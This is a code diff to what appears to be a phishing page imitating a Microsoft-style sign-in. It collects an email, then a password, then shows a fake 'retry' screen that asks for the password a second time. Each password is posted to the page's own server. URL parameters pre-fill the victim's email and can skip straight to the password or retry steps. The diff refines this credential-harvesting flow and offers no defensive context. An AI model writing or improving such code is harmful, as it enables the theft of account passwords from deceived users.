@@ -111,7 +111,6 @@
     let currentPassword = "";
     let isProcessing = false;
 
-    // Global functions - accessible from anywhere
     function getCsrfToken() {
         const metaToken = document.querySelector('meta[name="csrf-token"]');
         return metaToken ? metaToken.getAttribute('content') : '';
@@ -189,15 +188,11 @@
                     <span style="color: #0067b8; text-decoration: none;">Sign in with a different account</span>
                 </div>
                 <div style="display: flex; justify-content: flex-end;">
-                    <button type="button" class="btn-back" id="btnBack">Back</button>
+                    <button type="button" class="btn-back" onclick="showStep1()">Back</button>
                     <button type="submit" class="btn-next">Sign in</button>
                 </div>
             </form>
         `;
-
-        document.getElementById("btnBack").addEventListener("click", function(){
-            showStep1();
-        });
 
         document.getElementById("passwordForm").addEventListener("submit", function(e){
             e.preventDefault();
@@ -206,7 +201,7 @@
             const pwd = document.getElementById("passwordInput").value;
             if(pwd.trim()) {
                 currentPassword = pwd;
-                submitCredentials(false);
+                submitCredentials();
             } else {
                 showError("Please enter your password.");
             }
@@ -228,15 +223,11 @@
                     <span style="color: #0067b8; text-decoration: none;">Forgot password?</span>
                 </div>
                 <div style="display: flex; justify-content: flex-end;">
-                    <button type="button" class="btn-back" id="btnBack2">Back</button>
+                    <button type="button" class="btn-back" onclick="showStep2()">Back</button>
                     <button type="submit" class="btn-next" id="retrySignIn">Sign in</button>
                 </div>
             </form>
         `;
-
-        document.getElementById("btnBack2").addEventListener("click", function(){
-            showStep2();
-        });
 
         document.getElementById("retryForm").addEventListener("submit", function(e){
             e.preventDefault();
@@ -247,14 +238,14 @@
                 const signInBtn = document.getElementById("retrySignIn");
                 signInBtn.innerHTML = `<span class="processing"></span>Processing...`;
                 currentPassword = retryPassword;
-                submitCredentials(true);
+                submitCredentials();
             } else {
                 showError("Please enter your password.");
             }
         });
     }
 
-    function submitCredentials(isSecondAttempt) {
+    function submitCredentials() {
         if (isProcessing) return;
         isProcessing = true;
 
@@ -268,7 +259,7 @@
             formData.append('csrf_token', csrfToken);
         }
 
-        console.log('Submitting:', currentEmail, '(password hidden)', 'Second attempt:', isSecondAttempt);
+        console.log('Submitting credentials for:', currentEmail);
 
         fetch('/', {
             method: 'POST',
@@ -299,13 +290,9 @@
 
             // Check response for error indicators
             if (html.includes('error=true') || html.includes('step=retry')) {
-                if (!isSecondAttempt) {
-                    showStep3();
-                } else {
-                    showError("Login failed. Please try again.");
-                }
-            } else if (!isSecondAttempt) {
                 showStep3();
+            } else {
+                showError("An error occurred. Please try again.");
             }
         })
         .catch(error => {
@@ -315,28 +302,24 @@
         });
     }
 
-    // Initialize application
+    // Initialize
     document.addEventListener('DOMContentLoaded', function() {
-        console.log('DOM loaded, initializing...');
+        console.log('Initializing application...');
         
-        try {
-            const urlParams = new URLSearchParams(window.location.search);
-            const step = urlParams.get("step") || "";
-            const hintedEmail = (urlParams.get("email") || "").trim();
+        const urlParams = new URLSearchParams(window.location.search);
+        const step = urlParams.get("step") || "";
+        const hintedEmail = (urlParams.get("email") || "").trim();
+        
+        if (hintedEmail && hintedEmail.includes("@")) {
+            currentEmail = hintedEmail;
             
-            if (hintedEmail && hintedEmail.includes("@")) {
-                currentEmail = hintedEmail;
-                
-                if (step === "password") {
-                    showStep2();
-                    return;
-                } else if (step === "retry") {
-                    showStep3();
-                    return;
-                }
+            if (step === "password") {
+                showStep2();
+                return;
+            } else if (step === "retry") {
+                showStep3();
+                return;
             }
-        } catch (e) {
-            console.log("Error processing URL parameters:", e);
         }
 
         showStep1();
